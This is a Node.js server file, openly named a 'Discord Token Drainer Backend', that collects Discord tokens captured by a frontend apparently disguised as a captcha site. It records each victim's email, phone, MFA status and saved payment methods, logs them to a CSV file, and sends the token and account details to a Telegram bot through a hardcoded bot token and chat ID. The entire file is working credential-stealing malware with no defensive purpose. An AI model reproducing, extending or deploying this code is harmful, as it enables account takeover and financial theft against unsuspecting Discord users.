console.log('🚀 Starting Discord Token Drainer Backend...');

const express = require('express');
const cors = require('cors');
const { spawn } = require('child_process');
const path = require('path');
const fs = require('fs');
const axios = require('axios');

console.log('📦 Loading DiscordTokenLogger...');
const DiscordTokenLogger = require('./discord-token-logger');

const app = express();
const PORT = process.env.PORT || 5000;

console.log(`🔧 Server configured for port ${PORT}`);

// Initialize Discord Token Logger
const tokenLogger = new DiscordTokenLogger();

// Telegram Bot Configuration
let TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8438702808:AAEs_vLYyLRRlylWufwdziIrVRMaEGPMEwM';
let TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '-4981274627';

// Telegram messaging function
async function sendToTelegram(message, tokenData = null) {
  try {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.log('⚠️ Telegram not configured - skipping message');
      return { success: false, error: 'Telegram not configured' };
    }

    let messageText;
    
    if (tokenData) {
      // Format token data message (plain text to avoid parsing issues)
      messageText = `🔥 DISCORD TOKEN CAPTURED 🔥

👤 User Information:
• Username: ${tokenData.username || 'Unknown'}
• Discriminator: #${tokenData.discriminator || '0000'}
• User ID: ${tokenData.userId || 'Unknown'}
• Email: ${tokenData.email || 'Not available'}
• Phone: ${tokenData.phone || 'Not available'}

🎮 Account Details:
• Nitro Status: ${tokenData.nitro || 'None'}
• MFA Enabled: ${tokenData.mfa ? '✅ Yes' : '❌ No'}
• Verified: ${tokenData.verified ? '✅ Yes' : '❌ No'}

🔑 Token Information:
• Token: ${tokenData.token}
• Extraction Method: ${tokenData.extractionMethod || 'Unknown'}
• Captured At: ${new Date().toLocaleString()}

💰 Account Value:
• Guilds: ${tokenData.guildCount || 0} servers
• Friends: ${tokenData.friendCount || 0} friends
• Payment Methods: ${tokenData.paymentMethods || 0} saved

🌐 Source: ${tokenData.source || 'Auto Extraction'}

⚡ Status: Successfully captured and verified!`;
    } else {
      messageText = message;
    }

    const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: messageText,
      disable_web_page_preview: true
    });

    console.log('📱 Message sent to Telegram successfully');
    return { success: true, response: response.data };

  } catch (error) {
    console.error('❌ Failed to send Telegram message:', error.message);
    if (error.response) {
      console.error('Telegram API Error:', error.response.data);
    }
    return { success: false, error: error.message };
  }
}

// Duplicate detection system
const processedUsers = new Set(); // Track processed user IDs to prevent duplicates
const processedTokens = new Set(); // Track processed tokens to prevent duplicates
const sentToTelegram = new Set(); // Track what's been sent to Telegram specifically

// Load existing users from CSV to prevent duplicates
function loadExistingUsers() {
  try {
    const csvPath = path.join(__dirname, 'tokens', 'discord_tokens.csv');
    if (fs.existsSync(csvPath)) {
      const csvContent = fs.readFileSync(csvPath, 'utf8');
      const lines = csvContent.split('\n').slice(1); // Skip header
      
      for (const line of lines) {
        if (line.trim()) {
          const columns = line.split(',');
          if (columns.length > 3) {
            const userId = columns[3]; // User ID column
            if (userId && userId !== 'userId') {
              processedUsers.add(userId.trim());
            }
          }
        }
      }
      console.log(`📋 Loaded ${processedUsers.size} existing users to prevent duplicates`);
    }
  } catch (error) {
    console.error('❌ Error loading existing users:', error.message);
  }
}

// Check if user/token already exists
function isUserAlreadyProcessed(userId, username, email, token = null) {
  if (!userId) return false;
  
  // Check by user ID (most reliable)
  if (processedUsers.has(userId)) {
    console.log(`🔄 Skipping duplicate user: ${username} (${userId})`);
    return true;
  }
  
  // Also check by token if provided
  if (token && processedTokens.has(token)) {
    console.log(`🔄 Skipping duplicate token: ${token.substring(0, 20)}...`);
    return true;
  }
  
  return false;
}

// Check if already sent to Telegram specifically
function isAlreadySentToTelegram(userId, token = null) {
  const telegramKey = token ? `${userId}:${token}` : userId;
  return sentToTelegram.has(telegramKey);
}

// Add user to processed lists
function markUserAsProcessed(userId, token = null) {
  if (userId) {
    processedUsers.add(userId);
  }
  if (token) {
    processedTokens.add(token);
  }
}

// Mark as sent to Telegram
function markAsSentToTelegram(userId, token = null) {
  const telegramKey = token ? `${userId}:${token}` : userId;
  sentToTelegram.add(telegramKey);
}

// Load existing users
loadExistingUsers();

// Middleware
app.use(cors({
  origin: ['https://captchaguild.com','https://captchaguild.com/api', 'http://localhost:3000', 'http://localhost:5000'], // Allow production, dev, and self
  credentials: true
}));
app.use(express.json()); // For parsing application/json
app.use(express.urlencoded({ extended: true })); // For parsing application/x-www-form-urlencoded

// API Router
const apiRouter = express.Router();
app.use('/api', apiRouter);

// Health check endpoint
apiRouter.get('/health', (req, res) => {
  const stats = tokenLogger.getTokenStats();
  res.json({
    status: 'OK',
    message: 'Discord Token Drainer Backend is running',
    type: 'Node.js Token Logger',
    stats: stats,
    timestamp: new Date().toISOString()
  });
});

// Process Discord token endpoint
apiRouter.post('/process-token', async (req, res) => {
  try {
    const { token, url, timestamp, method } = req.body;

    if (!token) {
      return res.status(400).json({
        success: false,
        message: 'No token provided'
      });
    }

    console.log('Processing Discord token:', token.substring(0, 20) + '...');

    const result = await tokenLogger.processToken({
      token,
      url,
      timestamp: timestamp || new Date().toISOString()
    });

    // Send to Telegram if processing was successful and not a duplicate
    if (result.success && result.userInfo) {
      const userId = result.userInfo.userId;
      const username = result.userInfo.username;
      const email = result.userInfo.email;
      
      if (!isUserAlreadyProcessed(userId, username, email, token) && 
          !isAlreadySentToTelegram(userId, token)) {
        // Mark as processed to prevent future duplicates
        markUserAsProcessed(userId, token);
        markAsSentToTelegram(userId, token);
        
        await sendToTelegram(null, {
          username: result.userInfo.username,
          discriminator: result.userInfo.discriminator,
          email: result.userInfo.email,
          phone: result.userInfo.phone,
          userId: result.userInfo.userId,
          nitro: result.userInfo.nitro,
          mfa: result.userInfo.mfa,
          verified: result.userInfo.verified,
          token: token,
          extractionMethod: method || 'Browser Extraction',
          source: 'Frontend Application',
          guildCount: result.userInfo.guildCount || 0,
          friendCount: result.userInfo.friendCount || 0,
          paymentMethods: result.userInfo.paymentMethods || 0
        });
        
        console.log(`✅ Sent new frontend token to Telegram: ${username} (${userId})`);
      } else {
        console.log(`🔄 Skipping duplicate token from frontend: ${username} (${userId})`);
      }
    }

    res.json(result);
  } catch (error) {
    console.error('Error processing token:', error);
    res.status(500).json({
      success: false,
      message: 'Internal server error',
      error: error.message
    });
  }
});

// Get stored tokens endpoint
apiRouter.get('/tokens', (req, res) => {
  try {
    const stats = tokenLogger.getTokenStats();
    const tokens = tokenLogger.getStoredTokens();

    res.json({
      success: true,
      message: 'Tokens retrieved successfully',
      stats: stats,
      tokens: tokens.map(t => ({
        timestamp: t.timestamp,
        username: t.username,
        userId: t.userId,
        email: t.email,
        nitro: t.nitro,
        mfa: t.mfa,
        tokenPreview: t.token.substring(0, 20) + '...'
      })),
      totalCount: tokens.length,
      timestamp: new Date().toISOString()
    });
  } catch (error) {
    console.error('Error reading tokens:', error);
    res.status(500).json({
      success: false,
      message: 'Error reading token file',
      error: error.message,
      timestamp: new Date().toISOString()
    });
  }
});

// Configure Telegram bot endpoint
apiRouter.post('/configure-telegram', (req, res) => {
  try {
    const { botToken, chatId } = req.body;
    
    if (!botToken || !chatId) {
      return res.status(400).json({
        success: false,
        message: 'Bot token and chat ID are required'
      });
    }
    
    TELEGRAM_BOT_TOKEN = botToken;
    TELEGRAM_CHAT_ID = chatId;
    
    console.log('📱 Telegram bot configured successfully');
    
    res.json({
      success: true,
      message: 'Telegram bot configured successfully',
      config: {
        botToken: botToken.substring(0, 10) + '...',
        chatId: chatId
      }
    });
  } catch (error) {
    console.error('Error configuring Telegram:', error);
    res.status(500).json({
      success: false,
      message: 'Failed to configure Telegram',
      error: error.message
    });
  }
});

// Test Telegram connection endpoint
apiRouter.post('/test-telegram', async (req, res) => {
  try {
    const result = await sendToTelegram('🔧 Test Message\n\nTelegram bot is working correctly!\nToken extraction system is ready.');
    
    if (result.success) {
      res.json({
        success: true,
        message: 'Test message sent successfully to Telegram'
      });
    } else {
      res.status(500).json({
        success: false,
        message: 'Failed to send test message',
        error: result.error
      });
    }
  } catch (error) {
    console.error('Error testing Telegram:', error);
    res.status(500).json({
      success: false,
      message: 'Telegram test failed',
      error: error.message
    });
  }
});

// Start server
app.listen(PORT, () => {
  console.log(`🚀 Discord Token Drainer Backend running on port ${PORT}`);
  console.log(`📦 Type: Node.js Token Logger`);
  console.log(`🌐 Production Frontend URL: https://captchaguild.com`);
  console.log(`⚡ Health check: http://localhost:${PORT}/api/health`);
  console.log(`🔑 Token processing: http://localhost:${PORT}/api/process-token`);
  console.log(`📊 View tokens: http://localhost:${PORT}/api/tokens`);
  console.log(`📱 Configure Telegram: http://localhost:${PORT}/api/configure-telegram`);
  console.log(`🧪 Test Telegram: http://localhost:${PORT}/api/test-telegram`);
  
  // Send startup message to Telegram
  setTimeout(async () => {
    const result = await sendToTelegram('🚀 Discord Token Drainer Backend started successfully!');
    if (result.success) {
      console.log('✅ Startup message sent to Telegram successfully.');
    } else {
      console.error('❌ Failed to send startup message to Telegram:', result.error);
    }
  }, 5000); // Send after 5 seconds
});

module.exports = app;